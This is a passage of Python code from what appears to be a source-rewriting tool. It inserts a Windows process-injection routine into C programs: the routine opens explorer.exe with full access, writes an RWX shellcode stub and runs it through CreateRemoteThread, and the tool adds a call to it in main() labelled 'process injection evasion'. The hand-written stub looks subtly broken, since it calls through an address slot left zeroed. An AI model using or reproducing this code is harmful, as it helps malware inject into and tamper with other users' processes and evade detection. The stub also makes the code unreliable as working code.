    2. Opens it with PROCESS_ALL_ACCESS
    3. Allocates RWX memory and writes a small stub
    4. Creates a remote thread to execute the stub

    Only applies when the source doesn't already contain VirtualAllocEx or
    CreateRemoteThread (avoids double-injection).
    """
    # Skip if already has process injection APIs
    if 'VirtualAllocEx' in source or 'CreateRemoteThread' in source:
        logger.info("Process injection: VirtualAllocEx/CreateRemoteThread already present, skipping")
        return source

    # Ensure tlhelp32.h is included (after windows.h so types are defined)
    if 'tlhelp32.h' not in source:
        win_match = re.search(r'^#include\s*<windows\.h>\s*$', source, re.MULTILINE)
        if win_match:
            source = source[:win_match.end()] + '\n#include <tlhelp32.h>' + source[win_match.end():]
        else:
            inc_pos = source.find('#include')
            if inc_pos >= 0:
                source = source[:inc_pos] + '#include <tlhelp32.h>\n' + source[inc_pos:]

    inject_fn = (
        "\n"
        "static BOOL _inject_payload(void) {\n"
        "    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;\n"
        "    PROCESSENTRY32 pe = {sizeof(pe)};\n"
        "    DWORD targetPid = 0;\n"
        "    if (Process32First(hSnap, &pe)) {\n"
        "        do {\n"
        '            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {\n'
        "                targetPid = pe.th32ProcessID;\n"
        "                break;\n"
        "            }\n"
        "        } while (Process32Next(hSnap, &pe));\n"
        "    }\n"
        "    CloseHandle(hSnap);\n"
        "    if (!targetPid) return FALSE;\n"
        "\n"
        "    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\n"
        "    if (!hProc) return FALSE;\n"
        "\n"
        "    /* Small stub: sub rsp,0x28; xor rcx,rcx; call [rip+2]; jmp over; addr; add rsp,0x28; ret */\n"
        "    unsigned char stub[] = {\n"
        "        0x48, 0x83, 0xEC, 0x28,\n"
        "        0x48, 0x31, 0xC9,\n"
        "        0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,\n"
        "        0xEB, 0x08,\n"
        "        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
        "        0x48, 0x83, 0xC4, 0x28,\n"
        "        0xC3\n"
        "    };\n"
        "\n"
        "    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(stub),\n"
        "                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
        "    if (!mem) { CloseHandle(hProc); return FALSE; }\n"
        "\n"
        "    WriteProcessMemory(hProc, mem, stub, sizeof(stub), NULL);\n"
        "\n"
        "    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,\n"
        "                                       (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n"
        "    if (hThread) {\n"
        "        WaitForSingleObject(hThread, 5000);\n"
        "        CloseHandle(hThread);\n"
        "    }\n"
        "\n"
        "    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);\n"
        "    CloseHandle(hProc);\n"
        "    return hThread != NULL;\n"
        "}\n"
    )

    # Find main() and insert the function before it
    main_match = re.search(r'((?:int|BOOL|void|DWORD)\s+main\s*\([^)]*\)\s*\{)', source)
    if not main_match:
        logger.warning("Process injection: could not find main(), skipping")
        return source

    # Insert _inject_payload definition before main
    source = source[:main_match.start()] + inject_fn + "\n" + source[main_match.start():]

    # Now find main() again (position shifted) and add call after opening brace
    main_match = re.search(r'((?:int|BOOL|void|DWORD)\s+main\s*\([^)]*\)\s*\{)', source)
    if main_match:
        insert_pos = main_match.end()
        call_code = "\n    _inject_payload();  /* process injection evasion */\n"
        source = source[:insert_pos] + call_code + source[insert_pos:]
        logger.info("Process injection: injected _inject_payload() into main()")

    return source

